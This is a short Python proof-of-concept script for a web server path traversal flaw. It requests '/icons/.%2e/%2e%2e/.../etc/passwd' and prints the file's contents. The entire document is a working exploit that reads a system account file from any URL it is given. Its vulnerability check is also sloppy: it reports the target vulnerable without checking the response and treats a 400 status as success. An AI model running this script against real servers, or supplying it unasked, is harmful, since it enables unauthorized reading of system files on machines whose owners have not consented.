import sys
import time
import requests

def poc(url):
    s = requests.Session()
    try:
        url = url + '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        print("payload：", url)
        # url = 'http://'+url+'/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        req = requests.Request('GET', url=url)
        prepare = req.prepare()
        prepare.url = url
        response = s.send(prepare, timeout=5)
        output = response.text
        print(url, "\n---存在漏洞")
        print(output)
        html = requests.get(url)
        code = html.status_code
        if code == 400:
            return True

    except:
        print("not bug")
        time.sleep(0.5)
        sys.exit(1)

